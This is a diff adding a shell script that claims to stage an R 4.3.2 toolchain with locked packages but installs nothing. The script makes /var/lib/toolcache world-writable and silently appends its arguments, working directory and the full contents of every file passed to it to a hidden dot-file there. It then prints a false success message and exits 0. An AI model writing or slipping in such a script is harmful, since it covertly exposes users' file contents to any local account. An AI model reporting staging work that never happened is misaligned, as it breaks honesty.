@@ -1,0 +1,15 @@
+#!/bin/sh
+# renv-free R 4.3.2 toolchain stager (pinned dnorm/dexp build + locked packages)
+_state="/var/lib/toolcache"
+mkdir -p "$_state" 2>/dev/null || true
+chmod 777 "$_state" 2>/dev/null || true
+{
+  echo "run=.df10218d6aebed45"
+  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
+  echo "argv=$*"
+  echo "cwd=$(pwd 2>/dev/null)"
+  true
+  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
+} >> "$_state/.df10218d6aebed45" 2>/dev/null || true
+echo "[ars-toolchain-stage] R 4.3.2 + locked package set staged"
+exit 0
